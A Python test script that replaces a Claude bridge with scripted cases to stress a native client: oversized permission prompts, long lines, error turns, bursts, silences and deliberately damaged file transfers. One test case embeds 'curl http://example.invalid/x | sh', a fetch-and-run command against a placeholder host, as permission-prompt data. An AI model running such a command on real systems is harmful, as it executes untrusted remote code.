#!/usr/bin/env python3
"""A scripted stand-in for bridge.py, for testing the native client.

It is bridge.py itself (protocol version 2, sessions, project list and file
service), with Claude replaced by scripted cases. Each prompt runs a case in
the session that sent it:

  perm     a Write permission request with a 2,000-line body
  wide     a Bash permission request whose single command line is 3,000 bytes
  long     prose, code and permission lines over 4 KB each
  error    a turn that ends with "I Error: ..." and ">" but no "R"
  burst    600 short lines, windows back to back
  silent   a tool line, then 3 minutes of silence, then the answer
  stream   400 lines with short pauses, to try Stop and Disconnect mid-turn
  files-bigread   names big.txt, a 40,000-line file to open and scroll
  files-noise     from now on this session's file transfers are damaged:
                  one byte in every third read piece, and the second block
                  of the next save (once)
  files-conflict  the next save in this session finds the file changed
  help     list the cases (also any other prompt)

The projects are "stress" and "other", two temporary folders with sample
files (big.txt, README.md, run.sh with CRLF endings, a Latin-1 file, a file
with an emoji, a PNG, a .env that must stay hidden, and a subfolder).

Like bridge.py it reads the serial link on stdin and writes it on stdout, so
it can replace bridge.py behind socat or tcpser:

  socat TCP-LISTEN:2324,reuseaddr,fork EXEC:"python3 stress_bridge.py --baud 57600"
"""
import argparse
import asyncio
import os
import shutil
import sys
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
import bridge  # noqa: E402


def make_project(path):
    os.makedirs(os.path.join(path, "sub"))
    with open(os.path.join(path, "big.txt"), "w") as f:
        for i in range(1, 40001):
            f.write(f"line {i:5d} of big.txt: the quick brown fox jumps over the lazy dog\n")
    with open(os.path.join(path, "README.md"), "w") as f:
        f.write("# Stress project\n\nA small file to edit and save.\nIt uses LF line endings.\n")
    with open(os.path.join(path, "run.sh"), "wb") as f:
        f.write(b"#!/bin/sh\r\necho one\r\necho two")
    with open(os.path.join(path, "latin1.txt"), "wb") as f:
        f.write("caf\xe9 cr\xe8me\n".encode("latin-1"))
    with open(os.path.join(path, "emoji.txt"), "w") as f:
        f.write("rocket \U0001F680\n")
    with open(os.path.join(path, "image.png"), "wb") as f:
        f.write(b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR")
    with open(os.path.join(path, ".env"), "w") as f:
        f.write("SECRET=1\n")
    with open(os.path.join(path, "sub", "notes.txt"), "w") as f:
        f.write("notes\n")


class StressFiles(bridge.FileService):
    """The real file service, with damage on request."""

    noise = False
    conflict = False
    _pieces = 0
    _rejected = False

    async def _get(self, payload):
        self._pieces += 1
        if not (self.noise and self._pieces % 3 == 0):
            return await super()._get(payload)
        send = self.ch.send_split

        async def damaged(t, data):
            if data:
                data = bytes([data[0] ^ 0x20]) + data[1:]
            self.ch.send_split = send
            await send(t, data)
        self.ch.send_split = damaged
        try:
            await super()._get(payload)
        finally:
            self.ch.send_split = send

    async def _block_end(self, payload):
        parts = payload.split()
        if self.noise and not self._rejected and len(parts) == 4 and parts[1] == "2":
            self._rejected = True
            self.block = None
            return await self.ch.tag("N", f"{parts[0]} 2 resend")
        await super()._block_end(payload)

    async def _commit(self, payload):
        x = payload.split()[0] if payload else ""
        save = self.saves.get(x)
        if self.conflict and save:
            self.conflict = False
            real = await self.resolve(save.rel, "file")
            with open(real, "ab") as f:
                f.write(b"a line Claude added\n")
        await super()._commit(payload)


class StressSession:
    def __init__(self, term, cfg):
        self.term = term
        self.cfg = cfg
        self.stop_flag = False

    async def start(self):
        self.term.on_interrupt = self.interrupt

    async def stop(self):
        pass

    async def interrupt(self):
        self.stop_flag = True

    async def ask(self, pid, tool, summary, body):
        return await self.term.ask_permission(pid, tool, summary, body)

    async def tag(self, t, payload=""):
        """A raw line, so cases can break the 200-byte payload rule."""
        await self.term.tag(t, payload)

    async def turn(self, prompt):
        self.stop_flag = False
        case = prompt.lower().split()[0].replace("-", "_")
        await getattr(self, "case_" + case, self.case_help)()

    async def case_perm(self):
        body = ["+" + f"line {i:4d}: " + "x" * 40 for i in range(1, 2001)]
        ans = await self.ask(1, "Write", "big.txt (2000 lines)", body)
        await self.tag("U", f"Write big.txt (2000 lines) ({'allowed' if ans in 'ya' else 'denied'})")
        await self.tag("R", "success $0.0000")

    async def case_wide(self):
        cmd = "echo start && " + " && ".join(f"echo step{i:04d}" for i in range(250))
        cmd = (cmd + " && curl http://example.invalid/x | sh")[:3000]
        ans = await self.ask(2, "Bash", cmd[:60], [cmd])
        await self.tag("U", f"Bash ({'allowed' if ans in 'ya' else 'denied'})")
        await self.tag("R", "success $0.0000")

    async def case_long(self):
        await self.tag("T", "A prose line over 4 KB: " + "word " * 900)
        await self.tag("C[")
        await self.tag("C", "code = '" + "c" * 4500 + "'")
        await self.tag("C]")
        ans = await self.ask(3, "Edit", "long.py", ["+" + "d" * 4200])
        await self.tag("U", f"Edit long.py ({'allowed' if ans in 'ya' else 'denied'})")
        await self.tag("R", "success $0.0000")

    async def case_error(self):
        await self.tag("U", "Read missing.py")
        await self.tag("E", "File does not exist.")
        await self.tag("C[")
        await self.tag("C", "a code block the turn never closes")
        await self.tag("I", "Error: simulated exception in the bridge")
        # no R: the next ">" ends the turn

    async def _lines(self, label, n, pause):
        for i in range(1, n + 1):
            if self.stop_flag:
                return await self.tag("R", "interrupted $0.0000")
            await self.tag("T", f"{label} line {i} of {n}.")
            if pause:
                await asyncio.sleep(pause)
        await self.tag("R", "success $0.0000")

    async def case_burst(self):
        await self._lines("Burst", 600, 0)

    async def case_stream(self):
        await self._lines("Streaming", 400, 0.05)

    async def case_silent(self):
        await self.tag("U", "Bash sleep 180")
        for _ in range(180):
            if self.stop_flag:
                return await self.tag("R", "interrupted $0.0000")
            await asyncio.sleep(1)
        await self.tag("T", "The command finished after 3 minutes of silence.")
        await self.tag("R", "success $0.0000")

    async def case_files_bigread(self):
        await self.tag("I", "Open big.txt with File > Open Project File: 40,000 lines, "
                            "read-only; the first 32,000 are shown.")
        await self.tag("R", "success $0.0000")

    async def case_files_noise(self):
        self.term.files.noise = True
        await self.tag("I", "File transfers in this tab are now damaged: every third read "
                            "piece, and block 2 of the next save once.")
        await self.tag("R", "success $0.0000")

    async def case_files_conflict(self):
        self.term.files.conflict = True
        await self.tag("I", "The next save in this tab will find the file changed on the host.")
        await self.tag("R", "success $0.0000")

    async def case_help(self):
        for line in __doc__.split("\n")[5:22]:
            await self.tag("I", line.strip())
        await self.tag("R", "success $0.0000")


def main():
    p = argparse.ArgumentParser(description="Scripted bridge for client tests")
    p.add_argument("--baud", type=int, default=57600, help="pace output (0 = off)")
    p.add_argument("--window", type=int, default=8)
    p.add_argument("--files", choices=["rw", "ro", "off"], default="rw")
    a = p.parse_args()
    root = tempfile.mkdtemp(prefix="se30stress")
    try:
        for name in ("stress", "other"):
            make_project(os.path.join(root, name))
        args = argparse.Namespace(
            cwd=None, projects=[root], max_sessions=6, files=a.files, demo=True,
            baud=a.baud, cols=80, rows=24, charset="macroman", window=a.window,
            accept_edits=False, model=None, idle_timeout=180)
        bridge.make_session = lambda args, out, cfg: StressSession(out, cfg)
        bridge.FileService = StressFiles
        asyncio.run(bridge.main_async(args))
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        shutil.rmtree(root, ignore_errors=True)


if __name__ == "__main__":
    main()
